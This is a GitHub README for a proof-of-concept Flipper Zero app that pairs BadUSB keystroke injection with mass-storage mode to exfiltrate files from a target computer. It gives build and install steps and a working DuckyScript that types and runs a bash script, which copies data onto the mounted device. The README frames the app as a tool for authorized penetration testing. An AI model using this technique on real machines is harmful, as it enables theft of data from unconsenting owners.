<div align="center">

:broom: CutreLabs presents :broom:

Rubber Dolphy

A PoC about BadUSB for FlipperZero with exfiltration capabilities on device via mass storage
</div>

# Rubber Dolphy

The idea is to have a way to copy some data into FlipperZero when using it as **BadUsb** device, to perfom data exfiltration. 

Right now the project it's in a early code stage (it's just a hack), not more than a PoC and kind of "only works on my computers", I tested it on a **Arch Linux** and on a **Windows 11** computer. Testing this on a Mac OS still on the TODO list.

I have some ideas that I would like to try in order to improve the whole thing and push features to have a more useful and versatile FlipperZero BadUSB device. If I feel that the project has a good welcome, people try it and give support at least with :star: I will ponder continue with this ideas.

For now image for mass storage capabilities has 4.2 MB and type FAT (12-bit version)

## Demo

### Linux

[![Linux PoC](https://raw.githubusercontent.com/carvilsi/rubber-dolphy/main/.github/images/thumbnail_flipper_exfiltration_bad_usb_linux_poc.png)](https://raw.githubusercontent.com/carvilsi/rubber-dolphy/main/.github/images/flipper_exfiltration_bad_usb_linux_poc.mp4)

### Windows

[![Windows PoC](https://raw.githubusercontent.com/carvilsi/rubber-dolphy/main/.github/images/thumbnail_flipper_exfiltration_bad_usb_windows_poc.png)](https://raw.githubusercontent.com/carvilsi/rubber-dolphy/main/.github/images/flipper_exfiltration_bad_usb_windows_poc.mp4)

## Install and Run

Clone this repo somewhere on your machine. 

### Flipper Zero preparation

- Create *rubber_dolphy* folder on *SD Card/apps_data/*
- Create *msi* folder on *SD Card/apps_data/rubber_dolphy*
- Copy *rubber-dolphy/mass_storage_img/rdbdsbms.img* to *SD Card/apps_data/rubber_dolphy/msi/*

### Compile and launch it on Flipper Zero

Copy the *rubber_dolphy_app* folder into *applications_user* folder on flipperZero's firmware.

On the *flipperzero-firmware* folder:

`$ ./fbt launch APPSRC=rubber_dolphy`

Rubber-Dolpy FAP will be under *Apps/USB/*

### Upload the FAP

Alternatively to compile and lauch the app, after **completing step FlipperZero preparation**, you can upload the latest *rubber_dolphy.fap* from [releases](https://github.com/carvilsi/rubber-dolphy/releases) to *SD Card/apps/USB/* folder on FlipperZero. 

Do not forget to check the sha256sum ;)

### Ducky Scripts

Under [ducky_scripts_examples folder](https://github.com/carvilsi/rubber-dolphy/tree/main/ducky_scripts_examples) in this repo you'll find examples for Linux and Windows. And another simple DuckyScript called *mount_mass_storage_img* to access the mass storage on your laptop and get the copied data.

For now **Rubber Dolphy** still using the oficial *BadUSB* FlipperZero app assests folder, to deal with *layouts* and to select the *duckyscript* to run, therefore you must upload your duckyscripts to *SD Card/badusb/* folder.

#### How it works

For now the exfiltration from the victim's machine requires manual action on FlipperZero to perform the copy of the collected data. This is one of the points that I would like improve, trying to skip clicking when the DuckyScript finish.

A new Command called **STORAGE** has been added to the Command Set of [BadUSB File Format](https://developer.flipper.net/flipperzero/doxygen/badusb_file_format.html) in order to allow mass storage mode on FlipperZero once the DuckyScript has been finished. Then on the BadUSB GUI a button called *Exflt* appears. 

<div align="center">
  <p>
    <img src="https://github.com/carvilsi/rubber-dolphy/blob/main/.github/images/badusb_exflt.png" alt="badusb_exfiltration" >
  </p>
</div>

When clicking down, FlipperZero will exits BasdUSB mode and mounts a mass storage, the expected name of the unit on the threated machine is *MASSSTORAGE*.

<div align="center">
  <p>
    <img src="https://github.com/carvilsi/rubber-dolphy/blob/main/.github/images/badusb_massstorage.png" alt="badusb_masstorage" >
  </p>
</div>


The DuckyScript copies and runs a script that waits until this unit is available on the victims machine, and then copies the data to exfiltrate.

Once the file was copied to FlipperZero, **click Back button** to exit from *mass storage* mode and change to *basusb* mode. Another DuckyScript could be run again. There is no way to know that the data was already copied into FlipperZero; it's worth to add a feedback to the end of copying process on the DuckyScript. 

Here a DuckyScript example of the above described mechanism (bash).

```bash
REM =================== Exfiltration PoC ===================

REM Command to tell Flipper that will be exfiltration
REM Could be place at the begining of the file (after the ID if is there)
STORAGE

REM Create a bash script to do the exfiltration
STRINGLN cat > exfiltration.sh << EOF

STRINGLN #!/bin/bash
STRINGLN # Create a function to get the Mass Storage path
STRINGLN gms(){ ms=\$(df|awk '/MASSSTORAGE/{print \$6}');}

STRINGLN # Repeat until get the Mass Storage path 
STRINGLN until [ \`echo \$ms 2>/dev/null\` ];do gms;done;

REM Copy the generated file on the Mass Storage
STRINGLN cp my_data.txt \$ms

REM Feedback on finish copying
STRINGLN echo done :\)

STRINGLN EOF

REM Execute the script
STRINGLN sh exfiltration.sh

REM =======================================================
```

## Comments

The inspiration idea for this PoC came from this [FlipperZero Issue](https://github.com/flipperdevices/flipperzero-firmware/issues/1040)

I combined the code of [FlipperZero BadUSB](https://github.com/flipperdevices/flipperzero-firmware/tree/dev/applications/main/bad_usb) and the one of [flipperzero-good-faps mass_storage app](https://github.com/flipperdevices/flipperzero-good-faps/tree/dev/mass_storage)

---

⚠️ ADVISORY: This FlipperZero APP should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

---

Feedback from usage and contributions are very welcome.
Also if you like it, please leave a :star: I would appreciate it ;)

Hack The Planet! 
